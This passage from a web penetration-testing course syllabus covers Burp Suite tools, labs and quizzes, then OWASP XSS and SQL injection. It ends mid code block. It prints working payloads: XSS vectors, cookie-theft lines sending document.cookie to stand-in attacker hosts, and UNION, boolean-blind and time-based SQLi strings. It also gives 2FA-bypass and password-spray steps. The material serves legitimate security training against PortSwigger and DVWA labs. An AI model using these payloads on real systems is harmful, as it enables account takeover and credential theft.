   - **127.0.0.1:8080** ✓
   - 127.0.0.1:443
   - 127.0.0.1:22
   > Burp's Proxy listener defaults to 127.0.0.1:8080.
2. Why must Burp's CA certificate be installed in the browser's trust store?
   - To speed up page loading
   - **To intercept HTTPS traffic without triggering certificate warnings** ✓
   - To enable Intruder attacks
   - To change the proxy port
   > Since Burp performs a MITM on HTTPS, installing its CA certificate in the browser avoids certificate trust warnings.
3. What browser extension is used to route browser traffic through Burp's proxy?
   - **FoxyProxy** ✓
   - uBlock Origin
   - LastPass
   - Grammarly
   > FoxyProxy is the extension used to toggle the browser's traffic through Burp's proxy (127.0.0.1:8080).

#### 100. Intercepting & Modifying HTTP/HTTPS Requests `[theory]` — Week 8

With Intercept switched on in the Proxy tab, every request from your browser is paused for editing before Burp forwards it to the server. Because the edit happens after your browser has already applied its own client-side checks, this lets you bypass any validation done in JavaScript entirely — whether that's a hidden form value, a required field, or, as in the walkthrough example, deleting a parameter outright to skip a second-factor check.

**Key Points:**

- Proxy > HTTP History logs every request and response captured so far, so you can inspect or resend anything after the fact, not just what you're actively intercepting
- Turning Intercept on pauses each outgoing request in an editable raw view; clicking Forward sends your edited version instead of the browser's original
- Worked example: intercepting a login-flow request and changing a submit parameter's value let the app proceed to a page it wasn't meant to reach directly
- A second example from the same walkthrough: intercepting the follow-up request and deleting the otp field entirely bypassed a two-factor check, because the server apparently didn't safely handle a missing parameter
- You can send a captured request straight from HTTP History to Repeater when you need to try more than one edit, instead of re-intercepting from scratch each time

**Resources:**

- [PortSwigger Burp Proxy documentation](https://portswigger.net/burp/documentation/desktop/tools/proxy) _(link)_

**Quick Quiz:**

1. What does turning on Intercept in Burp's Proxy tab do?
   - Automatically forwards every request unmodified
   - **Pauses each captured request for manual editing before you click Forward** ✓
   - Deletes all HTTP history
   - Disables HTTPS entirely
   > With Intercept on, each request is paused so it can be edited before being forwarded to the server.
2. Why is intercepting a login POST request useful for testing?
   - **It allows tampering with parameters to attempt bypassing client-side checks entirely** ✓
   - It only shows response headers
   - It automatically finds SQL injection
   - It replaces the need for Repeater
   > Intercepting lets the tester edit the raw request before it reaches the server, bypassing any client-side-only validation.
3. Where can you review every request/response Burp has captured, even after Intercept is turned off?
   - **Proxy, HTTP History** ✓
   - Decoder tab
   - Comparer tab
   - Target, Scope only
   > Proxy then HTTP History logs every captured request/response for later review.

#### 101. Burp Repeater - Manual Request Manipulation `[theory]` — Week 8

Repeater exists for iterating on one request as many times as you like without re-capturing it from the browser each time — capture a request in Proxy (or pull one from HTTP History), send it to Repeater, then edit and click Send repeatedly. This is exactly the workflow trial-and-error payload crafting needs, whether that's probing a parameter for SQL injection or simply walking a numeric ID through a range of values.

**Key Points:**

- Workflow: right-click a captured request (from Intercept or from HTTP History) → Send to Repeater → edit a parameter → Send
- Concrete example from the source walkthrough: a GET request containing a productId parameter was sent to Repeater, and the ID value was changed repeatedly to enumerate which product IDs were valid
- Also useful mid-chain in a bypass flow: after tampering with a submit parameter to reach a further page, using Follow Redirection carries the flow forward to the next step (e.g. a 2FA page) so you can keep working the same request chain
- The source material explicitly calls out SQL injection as a prime use case for this kind of trial-and-error payload crafting, since Repeater keeps the request open for editing indefinitely

**Resources:**

- [PortSwigger Repeater documentation](https://portswigger.net/burp/documentation/desktop/tools/repeater) _(link)_

**Quick Quiz:**

1. What is Repeater primarily used for?
   - Automating brute-force attacks across many payloads
   - **Manually resending and iterating on the same captured request repeatedly** ✓
   - Encoding/decoding data
   - Scanning for vulnerabilities automatically
   > Repeater lets you manually edit and resend the same request as many times as needed for iterative testing.
2. What is the typical workflow to send a captured request to Repeater?
   - Decoder, then Comparer, then Repeater
   - **Right-click a captured request, Send to Repeater, edit a parameter, Send** ✓
   - Target, Scope, Repeater automatically
   - Intruder to Repeater conversion only
   > The described workflow is right-click a request, Send to Repeater, edit, then Send.
3. Manual SQL injection testing is best suited to which Burp tool?
   - **Repeater** ✓
   - Comparer
   - Sequencer
   - Decoder
   > Repeater is ideal for trial-and-error payload crafting like manual SQL injection testing, per this topic.

#### 102. Burp Intruder - Fuzzing & Brute Force (attack types: Sniper, Cluster Bomb) `[theory]` — Week 8

Intruder automates sending many variations of a captured request — you mark payload position(s) in the request, choose an attack type, supply a payload list, then launch. It's the standard tool for brute-force login attempts and endpoint fuzzing, and even though Burp Suite Community rate-limits Intruder attacks (unlike the paid Professional edition), it's still the tool reached for whenever a request needs to be sprayed with many values.

**Key Points:**

- Workflow: capture the request in Proxy → right-click → Send to Intruder → pick an attack type → add the payload → launch the attack
- After the attack runs, look through the responses for anything unusual — a redirect, a successful login, or a response that simply looks different from the rest
- Concrete username-enumeration example from the source: spraying a wordlist of usernames at a login form that reported 'wrong username' revealed the response for user Atlas had a length of 3250 — different from every other response — flagging it as a likely valid username before even reading the content
- Sniper attack type cycles one payload set through one marked position at a time — suited to testing a single parameter
- Cluster Bomb attack type combines multiple independent payload sets across multiple positions and tries every combination — suited to paired inputs like username+password
- Because Community edition's Intruder is rate-limited, expect slower throughput than Professional when spraying larger wordlists

**Resources:**

- [PortSwigger Intruder documentation](https://portswigger.net/burp/documentation/desktop/tools/intruder) _(link)_

**Quick Quiz:**

1. In Intruder, which attack type tests every combination of multiple payload sets across multiple positions?
   - Sniper
   - **Cluster Bomb** ✓
   - Battering Ram
   - Pitchfork-only mode
   > Cluster Bomb tests every combination across multiple payload sets/positions -- ideal for username+password pairs.
2. Which attack type cycles one payload set through one position at a time?
   - Cluster Bomb
   - **Sniper** ✓
   - Battering Ram
   - Grep-Match
   > Sniper cycles a single payload set through one position, ideal for testing a single parameter.
3. What does the Grep-Match option in Intruder's Options tab do?
   - Encodes payloads automatically
   - **Flags a specific string (e.g. 'Welcome back') appearing in each response, letting you instantly spot a correct guess** ✓
   - Deletes non-matching responses
   - Automatically decrypts TLS traffic
   > Grep-Match flags responses containing a defined string, making it easy to spot the successful attempt among many results.

#### 103. Burp Decoder - Encode, Decode, Hash data `[theory]` — Week 8

Decoder handles data transformation on the fly — you can decode information Burp has captured, or encode a payload correctly before sending it on to the target. Alternative encoding tools exist outside Burp, but doing the conversion inside Burp, right next to the request/response you're already working with, is far more efficient than switching tools mid-workflow.

**Key Points:**

- Two directions available from the same panel: decode data you've captured from the target, or encode a payload before you send it
- Worked example from the source material: a simple JavaScript payload was URL-encoded in Decoder, then decoded back to its original form to verify the encoding round-trip before sending it to the target
- Because Decoder sits inside Burp, data can be copied straight from a captured request or response into it without leaving the tool

**Resources:**

- [PortSwigger Decoder documentation](https://portswigger.net/burp/documentation/desktop/tools/decoder) _(link)_
- [CyberChef](https://gchq.github.io/CyberChef/) _(tool)_

**Quick Quiz:**

1. What encodings/functions does Burp's Decoder support?
   - Only Base64
   - **Base64, URL, HTML encoding/decoding, and common hash functions** ✓
   - Only AES encryption
   - Only SQL syntax highlighting
   > Decoder supports Base64, URL, HTML encoding/decoding, and common hash functions.
2. A practical use of Decoder mentioned in this topic is:
   - **URL-encoding a '/' to %2f to smuggle a path-traversal character past a naive filter** ✓
   - Cracking bcrypt hashes offline
   - Performing a live Nmap scan
   - Generating an RSA keypair
   > Decoder can URL-encode characters like '/' to %2f to bypass simple filters, as described in this topic.
3. Which of these is a typical Decoder use case?
   - **Decoding captured information or encoding a payload correctly before sending it to the target** ✓
   - Managing VLANs
   - Running a Nessus scan
   - Editing the Windows registry
   > Decoder transforms data on the fly -- decoding captured data or encoding payloads before they're sent.

#### 104. Burp Scanner - Passive vs Active Scanning `[theory]` — Week 8

Burp's automated Scanner (Professional edition) crawls and tests an application for common vulnerability classes without manual intervention.

**Key Points:**

- Passive scanning: analyses traffic you generate normally, flags issues without sending extra requests
- Active scanning: Burp actively sends crafted/malicious requests to probe for vulnerabilities (SQLi, XSS, etc.)
- Community edition lacks Scanner — this course relies primarily on the manual tools (Repeater/Intruder) instead

**Resources:**

- [PortSwigger Burp Scanner documentation](https://portswigger.net/burp/documentation/scanner) _(link)_

**Quick Quiz:**

1. Which Burp edition includes the automated Scanner tool?
   - Community
   - **Professional** ✓
   - Both equally
   - Neither edition includes Scanner
   > Burp's automated Scanner is a Professional-edition feature; Community lacks it.
2. What is the difference between passive and active scanning in Burp?
   - **Passive analyses traffic you generate normally without extra requests; Active sends crafted/malicious requests to probe for vulnerabilities** ✓
   - Passive sends extra requests; Active only observes
   - They are identical
   - Passive only works on HTTPS
   > Passive scanning flags issues from normal traffic without extra requests; Active scanning proactively sends crafted probes.
3. Since Community edition lacks Scanner, what does this course rely on primarily instead?
   - **Manual tools like Repeater and Intruder** ✓
   - Only Nessus
   - Only automated scanning via OpenVAS
   - No testing tools at all
   > Since Community lacks Scanner, the course relies primarily on manual Repeater/Intruder-based testing.

#### 105. Scope Configuration & Target Sitemap `[theory]` — Week 8

The Target tab's Site map builds automatically as you browse an application through the proxy — every URL you touch while the proxy is switched on gets added to the map, giving a single tree view of the application's structure instead of tracking pages by hand.

**Key Points:**

- The site map only grows while the proxy is actively capturing traffic — browse through Burp (or the FoxyProxy-routed browser) and the tree fills in automatically
- The Burp dashboard's top bar lists every available tool (Proxy, Repeater, Intruder, Decoder, Comparer, Sequencer, Target and more) so you can jump straight to whichever one you need for a captured request

**Resources:**

- [PortSwigger Target/Scope documentation](https://portswigger.net/burp/documentation/desktop/tools/target) _(link)_

**Quick Quiz:**

1. What is the purpose of Target, Scope in Burp?
   - To encrypt traffic
   - **To keep Burp focused only on the application under test, filtering out unrelated domains/trackers** ✓
   - To generate RSA keys
   - To crack passwords
   > Defining scope filters HTTP History/Site map to in-scope traffic only, reducing noise from unrelated domains.
2. What does the Target tab's Site map show?
   - **A tree of every URL Burp has observed for the app** ✓
   - A list of cracked passwords
   - A network topology diagram
   - A CVE database
   > The Site map builds a tree of every observed URL for the application under test.
3. Why would a pentester add the target domain to Scope before testing?
   - To make Burp ignore the target entirely
   - **To filter out noise from unrelated domains/third-party trackers seen in traffic** ✓
   - To disable Intercept
   - To install the CA certificate
   > Adding the target domain to scope filters out unrelated third-party domains/trackers from cluttering the view.

#### 106. Lab: Set up Burp + Firefox, intercept login request `[lab]` — Week 8

This lab mirrors the source walkthrough's own login → intercept → repeater → 2FA-bypass challenge end to end: with the proxy and Intercept both on, submit a login form, capture the raw POST request in Burp, edit it before forwarding, then chain into Repeater and Follow Redirection to reach a second-factor prompt you can also intercept and strip clean.

**Key Points:**

- With Intercept on in the Proxy tab, submit the login form in your browser and observe the raw captured request pause in Burp before it reaches the server
- Edit the intercepted request directly — the walkthrough's example changes a submit parameter's value, which lets the app proceed straight to a page it wasn't meant to reach yet
- Click Forward to send your edited version; if you need to try several edits on the same request, send it to Repeater instead of re-intercepting from scratch each time
- Use Follow Redirection to follow the app's redirect after a tampered request — in the walkthrough this leads to a 2FA page
- Check Proxy > HTTP History afterward: it lists every request/response made through the proxy so far, and any of them can be sent to Repeater for further testing
- To bypass the 2FA step itself, turn Intercept back on, catch the OTP-submission request, and delete the otp field entirely from the raw request before forwarding

**Resources:**

- [PortSwigger Web Security Academy](https://portswigger.net/web-security) _(platform)_
- [FoxyProxy](https://getfoxyproxy.org) _(tool)_

**Quick Quiz:**

1. What is the first step before intercepting any traffic in this lab?
   - **Enable FoxyProxy pointing at 127.0.0.1:8080** ✓
   - Run an Nmap scan
   - Generate an RSA keypair
   - Install Nessus
   > FoxyProxy must be installed/enabled pointing at Burp's listener before traffic will route through Burp.
2. After turning on Intercept and submitting a login form, what should you observe in Burp?
   - **The raw captured POST request, including submitted parameters** ✓
   - A cracked password hash
   - A Nessus vulnerability report
   - A subnet calculation
   > The lab has you observe the raw captured POST request in the Proxy tab before forwarding it.
3. What does the lab suggest trying after capturing the login request, to observe app behaviour?
   - **Removing an otp parameter and forwarding the request** ✓
   - Deleting the entire request
   - Disabling FoxyProxy mid-request
   - Switching to Decoder only
   > The lab suggests tampering a field like removing the otp parameter, then forwarding to see how the app responds.

#### 107. Lab: Burp Repeater - manual SQLi test `[lab]` — Week 8

Use Burp Repeater to manually probe DVWA's SQL Injection page with hand-crafted payloads across all three configurable security levels, building the muscle memory for real-world SQLi discovery: form a hypothesis, send one modified request at a time, read the response diff, and adjust — instead of relying on an automated scanner. This is the same Repeater habit the source walkthrough describes for its productId enumeration example: capture the request once, then keep editing that same request in place and hitting Send rather than re-intercepting each time, just aimed at a SQL injection payload instead of an ID value.

**Key Points:**

- Capture a filter/search request (e.g. GET /filter?category=Gifts) and send it to Repeater
- This mirrors the walkthrough's own Repeater workflow: capture the request → Send to Repeater → edit the parameter → Send, repeated for each payload variation
- Inject a payload into the parameter: Gifts' OR 1=1 --
- Highlight the payload and press Ctrl+U to URL-encode it before sending
- Send the request; a successful injection returns rows the original query shouldn't have returned

```bash
GET /filter?category=Gifts'+OR+1%3d1-- HTTP/2
```

**Resources:**

- [PortSwigger - SQL injection](https://portswigger.net/web-security/sql-injection) _(platform)_
- [DVWA](https://github.com/digininja/DVWA) _(tool)_

**Quick Quiz:**

1. What is the example SQLi payload used in this Repeater lab?
   - **Gifts' OR 1=1 --** ✓
   - <script>alert(1)</script>
   - ../../../etc/passwd
   - 1|whoami
   > The lab's example payload injects Gifts' OR 1=1 -- into the category parameter.
2. What keyboard shortcut in Burp URL-encodes a highlighted payload before sending?
   - **Ctrl+U** ✓
   - Ctrl+E
   - Ctrl+R
   - Ctrl+D
   > Highlighting a payload and pressing Ctrl+U URL-encodes it in Burp before sending.
3. How do you know a manual SQL injection attempt succeeded in this lab?
   - **The response returns rows the original query shouldn't have returned** ✓
   - The server returns a 500 error every time
   - The request is automatically blocked
   - Burp displays a green padlock icon
   > A successful injection is confirmed when the response includes unintended rows/data the original query should not have returned.

#### 108. Lab: Burp Intruder - password spray on DVWA `[lab]` — Week 8

Use Intruder to automate a password-spraying attempt against a DVWA login form, identifying which credentials are valid from the response. This follows the exact Intruder workflow from the source walkthrough: capture the login request in the proxy, send it to Intruder, mark the payload position, choose an attack type, add a payload list, launch, then scan the responses for anything unusual — a redirect or a successful login — rather than reading every response by hand.

**Key Points:**

- Capture the DVWA login POST request in the proxy, right-click, and send it to Intruder
- Mark the password field as the payload position; choose Sniper attack type
- Load a small wordlist as a Simple list payload set
- Enable Grep-Match for a string only present on successful login (e.g. 'Welcome') to instantly spot the hit
- The walkthrough's own username-enumeration example shows why this works: one response (for a valid username called Atlas) had a completely different length — 3250 — from all the others, flagging it as a hit before even reading the content; that same length/content signal is what you're using Grep-Match to catch here

**Resources:**

- [PortSwigger Intruder documentation](https://portswigger.net/burp/documentation/desktop/tools/intruder) _(link)_
- [DVWA](https://github.com/digininja/DVWA) _(tool)_

**Quick Quiz:**

1. Which attack type is used for this password-spray lab against a single password field?
   - Cluster Bomb
   - **Sniper** ✓
   - Battering Ram
   - Pitchfork
   > The lab specifies marking the password field and choosing the Sniper attack type.
2. What payload set type is used to load the wordlist in this lab?
   - **Simple list** ✓
   - Numbers
   - Character substitution
   - Recursive grep
   > The lab loads a small wordlist as a 'Simple list' payload set in Intruder.
3. How does the lab identify which password attempt succeeded?
   - **By enabling Grep-Match for a string only present on successful login (e.g. 'Welcome')** ✓
   - By checking the HTTP status code is always 200
   - By counting response time only
   - By checking the response is empty
   > Grep-Match flags responses containing a success-only string like 'Welcome', instantly identifying the correct password.


---

## M9: OWASP Top 10 - Web Attacks Part 1

**Month 3** · Week 9 · 11 topics

The exploitation phase begins here — the classic OWASP Top 10 vulnerability classes, exploited hands-on with real payloads against PortSwigger and DVWA labs: XSS, SQL Injection, Broken Access Control, Path Traversal, Command Injection, and CSRF.

**Learning Outcomes:**

- Exploit Reflected, Stored, and DOM-based XSS with real payloads
- Perform manual UNION-based and Blind SQL injection
- Identify and exploit IDOR and forced-browsing access control flaws
- Exploit path traversal and OS command injection
- Build and deliver a working CSRF proof-of-concept

**Module Resources:**

- [PortSwigger Web Academy](https://portswigger.net/web-security) _(platform)_
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_
- [OWASP Top Ten Project](https://owasp.org/www-project-top-ten/) _(link)_
- [DVWA](https://github.com/digininja/DVWA) _(tool)_

**Module Quiz (10 questions):**

1. Which vulnerability class is present in 94% of tested applications, per the data cited in this module?
   - SQL Injection
   - **Broken Access Control** ✓
   - XSS
   - CSRF
   > The Broken Access Control topic cites OWASP data showing it appears in 94% of tested applications, the highest prevalence of the classes covered in this module.
2. Comparing a UNION-based SQLi payload with a stored XSS payload, what distinguishes their persistence model?
   - SQLi payloads are always more severe than XSS
   - **UNION-based SQLi extracts data in a single request/response; stored XSS persists server-side and re-executes for every subsequent visitor** ✓
   - Both require a victim to click a link
   - Neither can be automated
   > UNION-based SQLi is a direct, one-shot data extraction technique, whereas stored XSS's defining trait is that the payload is saved and re-triggers for every future viewer.
3. An application blocks the literal string "script" in user input, but a comment payload still executes JavaScript in the browser. What does this represent, and why is blacklisting insufficient?
   - CSRF token bypass — tokens aren't checked at all
   - **XSS filter bypass — blacklisting specific substrings misses equivalent payloads (e.g. event handlers, encoding)** ✓
   - SQL injection — because comments are stored in a database
   - Path traversal — because comments are files on disk
   > Blacklist-based filters that block specific strings are trivially bypassed with alternative XSS vectors, such as event handlers or case variation, that don't contain the blocked substring.
4. Which combination correctly pairs a vulnerability with its OWASP-referenced root-cause CWE?
   - XSS - CWE-89
   - SQLi - CWE-79
   - **Command Injection - CWE-77** ✓
   - IDOR - CWE-77
   > CWE-77 (Command Injection) is correctly paired; XSS is actually CWE-79 and SQLi is CWE-89, making the other options mismatched.
5. A pentester finds ' AND (SELECT 'a' FROM users LIMIT 1)='a returns a different response than the same payload ending in ='b. What technique is this?
   - Error-based SQLi
   - **Blind boolean-based SQLi** ✓
   - Stored XSS
   - CSRF
   > Comparing two conditional payloads and observing different application behaviour based on the true/false condition, without any direct data in the response, defines blind boolean-based SQL injection.
6. Which statement about horizontal vs vertical privilege escalation is correct?
   - **Horizontal: a same-privilege-level user accesses another user's data; Vertical: a lower-privilege user reaches higher-privilege functionality** ✓
   - Horizontal: a user becomes admin; Vertical: a user accesses another same-level user's data
   - They are synonyms for the same attack
   - Horizontal only applies to admin accounts
   > Horizontal privilege escalation stays at the same trust level but crosses between different users' data; vertical privilege escalation crosses from a lower to a higher trust tier.
7. Why does sqlmap require a candidate injection point to already be suspected before it's run?
   - **sqlmap automates detection and exploitation once a parameter is suspected vulnerable; it isn't a full-application crawler that discovers every vulnerable parameter unassisted** ✓
   - sqlmap must be given the database password first
   - sqlmap only works with GET requests
   - sqlmap requires source code access
   > sqlmap automates the detection and exploitation of SQL injection once pointed at a candidate parameter/request, rather than independently discovering every injectable field across an application.
8. In a CSRF proof-of-concept, why is a GET-based state-changing action even easier to exploit than a POST-based one?
   - **It requires no form submission — the malicious action can be triggered just by loading an <img> tag pointing at the URL** ✓
   - GET requests are always encrypted
   - GET requests bypass all authentication
   - GET requests cannot carry cookies
   > A GET-based state change can be triggered simply by embedding the URL in an image tag, requiring no JavaScript or form auto-submission at all.
9. Which mitigation most directly addresses path traversal at the root cause, rather than just filtering known attack strings?
   - Blacklisting "../"
   - **Canonicalising the resolved path and enforcing it remains within an allowed base directory** ✓
   - Rate-limiting requests
   - Adding a CSRF token to the download request
   > Canonicalising the path and checking it's still within the intended base directory closes off traversal via encoding tricks or alternate path syntax that blacklist filtering would miss.
10. Which of these best explains why DVWA's four difficulty levels are pedagogically useful for learning SQLi/XSS?
   - **They demonstrate how the same vulnerability class requires progressively different bypass techniques as mitigations are added, culminating in a properly-fixed 'Impossible' level** ✓
   - They test unrelated vulnerability classes at each level
   - Higher levels use a different database engine
   - They only change the UI styling
   > Each DVWA level adds a real-world mitigation layer, so working through Low to Impossible teaches both the attack and why each specific defense does or doesn't work.

### Topics

#### 109. OWASP Top 10 Overview & Significance `[theory]` — Week 9

Injection and related flaws happen when an application fails to separate untrusted input from the commands or queries it executes — like a vending machine that dispenses free snacks if you find a button combination it wasn't built to expect. The CWEs tracked across this module (CWE-79 XSS, CWE-89 SQLi, CWE-77 Command Injection, CWE-73 external control of file/path name, CWE-200/CWE-201 sensitive-data exposure, CWE-352 CSRF) recur across real breaches: SQL injection was the entry point for the 2014 Sony Pictures hack, in which the Lazarus Group exfiltrated unreleased films and employee data, and an unpatched, known-vulnerable Apache Struts component (CVE-2017-5638) let attackers steal 147 million records in the 2017 Equifax breach. The broader injection family the source material tracks extends further still — CWE-943 (NoSQL Injection), CWE-91 (XML Injection), and CWE-90 (LDAP Injection) round out the notable CWEs beyond the classes exploited hands-on in this module. Broken access control alone was found in 94% of applications tested, at an average incidence rate of 3.81% — making it one of the highest-prevalence weakness categories covered here. Every topic in this module traces back to the same five failure impacts and the same handful of fixes.

**Key Points:**

- Common impacts of every injection-class vulnerability: data theft, authentication bypass, data manipulation, system compromise, information disclosure
- Named CWEs covered in this module: CWE-79 (XSS), CWE-89 (SQLi), CWE-77 (Command Injection), CWE-73 (external control of file/path name), CWE-200/CWE-201 (sensitive info exposure), CWE-352 (CSRF)
- Broken access control appeared in 94% of tested applications, average incidence rate 3.81% — the highest-prevalence class in this module
- Real breach: SQL injection in the 2014 Sony Pictures hack (Lazarus Group) exfiltrated unreleased movies and employee data
- Real breach: an unpatched, known-vulnerable Apache Struts component (CVE-2017-5638) let attackers steal 147 million records in the 2017 Equifax breach
- Universal mitigations threaded through every topic below: never trust user input, parameterized queries, context-aware output encoding, least privilege
- Broader injection family noted alongside this module's covered CWEs: CWE-943 (NoSQL Injection), CWE-91 (XML Injection), CWE-90 (LDAP Injection)

**Resources:**

- [OWASP Top Ten Project](https://owasp.org/www-project-top-ten/) _(link)_
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_

**Quick Quiz:**

1. Which CWE is the root-cause classification for Cross-Site Scripting (XSS)?
   - CWE-89
   - **CWE-79** ✓
   - CWE-77
   - CWE-943
   > CWE-79 (Improper Neutralization of Input During Web Page Generation) is specifically the XSS root-cause weakness class.
2. Which of the following is listed as a core best practice threaded through the OWASP Top 10 mitigations?
   - Trust client-side validation alone
   - **Use parameterised queries** ✓
   - Store passwords in plaintext for speed
   - Disable all server logging
   > Parameterised queries separate code from data, which is one of the repeated best practices across almost every injection-class vulnerability.
3. Per this topic's key points, which CWE corresponds to OS Command Injection?
   - CWE-79
   - CWE-89
   - **CWE-77** ✓
   - CWE-943
   > CWE-77 is Improper Neutralization of Special Elements used in a Command, the root-cause class for command injection.

#### 110. XSS - Reflected, Stored, DOM-based (theory + impact + payloads) `[theory]` — Week 9

Cross-Site Scripting injects attacker JavaScript into a page so it runs in another user's browser, and the three flavours differ in where the untrusted data comes from and how long it survives. In the PortSwigger reflected-XSS lab, the search box echoes input like <h1>Hello world</h1> straight back into the page unencoded — confirmed by inspecting the rendered HTML, and by first submitting a benign query such as 'Hello world' and seeing it reflected verbatim in the message 0 results found for "Hello world" — before the working exploit <script>alert(1)</script> fires; in the stored lab, posting <script>alert(document.cookie)</script> as a blog comment persists it server-side so it fires for every visitor who later loads that page, letting the attacker execute arbitrary JavaScript, steal cookies, or perform actions on behalf of the victim, which is why stored XSS is described as capable of full account takeover. DOM-based XSS is different again: the vulnerable sink lives entirely in client-side JavaScript — a trackSearch(query) function calls document.write() with query read straight from location.search — so the fix is to break out of the resulting img src attribute rather than a script tag; a simpler textbook version of the same flaw is document.body.innerHTML = 'Welcome, ' + location.search.substring(6);, reflecting a name parameter straight into the page via a URL like http://example.com/welcome.html?name=alert('XSS'). A source-material risk table rates Reflected and DOM-based XSS as High risk and Stored XSS as Critical, the highest of the three. Real attacks weaponize any of these to run cookie-theft code or redirect the victim's browser outright.

**Key Points:**

- Reflected: payload comes from the current request; the PortSwigger lab confirms <h1>Hello world</h1> renders unencoded via page Inspect before injecting <script>alert(1)</script>
- Stored: <script>alert(document.cookie)</script> posted as a blog comment persists server-side and fires for every subsequent visitor — described as capable of 'complete user account takeover'
- DOM-based: vulnerable sink is document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">') reading directly from location.search via URLSearchParams, with no validation or encoding
- DOM breakout payload "><img src=x onerror=alert('XSS_doomed')> closes the existing src attribute, injects a new <img>, and fires JS via the onerror handler when the bogus image fails to load
- Real-world cookie-theft pattern: fetch('https://attacker-site.com/steal?cookies=' + document.cookie) or document.location='http://malicious-site.com/steal?cookie='+document.cookie
- Delivery vector for reflected XSS: a crafted link containing the payload sent via email or text — it only executes once the victim clicks it
- Mitigation grounded in the source material: avoid document.write(), sanitize with something like DOMPurify, HTML-escape output (html.escape()), apply a Content Security Policy
- Risk classification from the source material: Reflected XSS (source: HTTP request, not persistent, requires user action) and DOM-based XSS (source: client-side code, not persistent, requires user action) are rated High risk; Stored XSS (source: database/logs, persistent, no user action required) is rated Critical
- Confirming reflection before injecting: submitting a benign query like 'Hello world' into the vulnerable search box echoes it back verbatim in the message 0 results found for "Hello world" — proof the input is unsanitized before attempting a script payload
- A simpler textbook DOM-XSS pattern from the source material: document.body.innerHTML = 'Welcome, ' + location.search.substring(6); reflects a name parameter straight into the page, exploitable via a URL like http://example.com/welcome.html?name=alert('XSS')
- Stored XSS lets an attacker perform actions on behalf of the victim, in addition to executing arbitrary JavaScript and stealing cookies

```bash
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<h1>Hello world</h1>
"><img src=x onerror=alert('XSS_doomed')>
fetch('https://attacker-site.com/steal?cookies=' + document.cookie)
document.body.innerHTML = 'Welcome, ' + location.search.substring(6);
http://example.com/welcome.html?name=alert('XSS')
```

**Resources:**

- [PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) _(link)_
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) _(link)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(link)_
- [PwnFunction (YouTube)](https://www.youtube.com/@PwnFunction) _(video)_

**Quick Quiz:**

1. Which payload demonstrates breaking out of an HTML attribute context to trigger XSS via an event handler?
   - <script>alert(1)</script>
   - **"><img src=x onerror=alert('XSS')>** ✓
   - ' OR 1=1 --
   - {{7*7}}
   > The leading "> closes the existing attribute/tag before injecting an img element whose onerror handler executes JS, a classic attribute-context breakout distinct from a plain script tag.
2. Which payload proves an attacker could exfiltrate the victim's session token rather than merely proving script execution?
   - <script>alert(1)</script>
   - **<script>alert(document.cookie)</script>** ✓
   - <?php system($_GET['cmd']); ?>
   - ../../../../etc/passwd
   > alert(document.cookie) surfaces the victim's cookie value, demonstrating real impact beyond just proving JavaScript runs.
3. Which XSS variant is considered highest severity because the payload persists server-side and is served to every visitor automatically?
   - Reflected
   - **Stored** ✓
   - DOM-based
   - Blind SQLi
   > Stored XSS saves the payload server-side (e.g. in a comment) and delivers it to every viewer without needing a victim to click a crafted link.

#### 111. SQL Injection - Manual & Using sqlmap `[theory]` — Week 9

SQL Injection happens when unsanitized user input reaches a database query, and the source labs walk through all three major variants end to end. In the WHERE-clause lab, the query SELECT * FROM products WHERE category='Gifts' AND released=1 is first confirmed injectable by passing a bare single quote as the category value, which breaks the query into SELECT * FROM products WHERE category = ''' AND released = 1 and throws a SQL syntax error from the unclosed quote, then bypassed by sending category=Gifts' OR 1=1-- through Burp Repeater (URL-encoded with Ctrl+U), turning it into an always-true OR that dumps unreleased products too. UNION-based injection requires first fingerprinting the column count by sending '+UNION+SELECT+NULL-- and adding NULLs one at a time until the SQL error disappears, then swapping two of those NULL placeholders for username and password to exfiltrate credentials directly in the response. Blind SQLi, used when there's no visible output, is solved by comparing true/false conditions on a TrackingId cookie, confirming the users table and administrator account with subqueries, then extracting the password length and each character via SUBSTRING and Burp Intruder with a Grep-Match on the 'Welcome back' string (or a WAITFOR DELAY time-based variant when there's no response difference at all). This class of bug is not theoretical: SQL injection vulnerabilities were the entry point for the 2014 Sony Pictures hack, in which the Lazarus Group exfiltrated unreleased films and employee data.

**Key Points:**

- WHERE-clause bypass: ' OR 1=1 -- turns WHERE category='Gifts' AND released=1 into an always-true condition, exposing unreleased products (via Burp Repeater, URL-encoded with Ctrl+U)
- UNION-based: determine column count by incrementally sending '+UNION+SELECT+NULL--, then NULL,NULL--, etc. until the SQL error disappears
- UNION exfiltration once column count is known: ' UNION SELECT null, username, password FROM users-- returns credentials inline with normal results
- Boolean-blind SQLi: compare TrackingId=xyz' AND '1'='1 (true) against TrackingId=xyz' AND '1'='2 (false) via the 'Welcome back' message appearing/disappearing, then confirm the users table with (SELECT 'a' FROM users LIMIT 1)='a
- Character-by-character extraction: (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a run through Burp Intruder with a Grep-Match on 'Welcome back', one position and character at a time
- Time-based blind variant when there's no visible response difference at all: ' IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '00:00:05' --
- Automating extraction: a Python script using requests can loop ascii(SUBSTRING(password, i, 1)) over character codes 32-126 per position, far faster than manual Intruder runs
- Real-world impact: SQL injection was the entry vector for the 2014 Sony Pictures hack (Lazarus Group), used to exfiltrate unreleased films and employee data
- Mitigation: parameterized queries (cursor.execute(query, [username, password])) and stored procedures instead of string-concatenated SQL
- Confirming the injection point before crafting the bypass: passing a single quote ' as the category parameter turns the query into SELECT * FROM products WHERE category = ''' AND released = 1, producing a SQL syntax error from the unclosed quote — proof the input reaches the query unescaped

```bash
' OR 1=1 --
' UNION SELECT null, username, password FROM users--
' AND (SELECT 'a' FROM users LIMIT 1)='a
Gifts' OR 1=1 --
'+UNION+SELECT+NULL--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
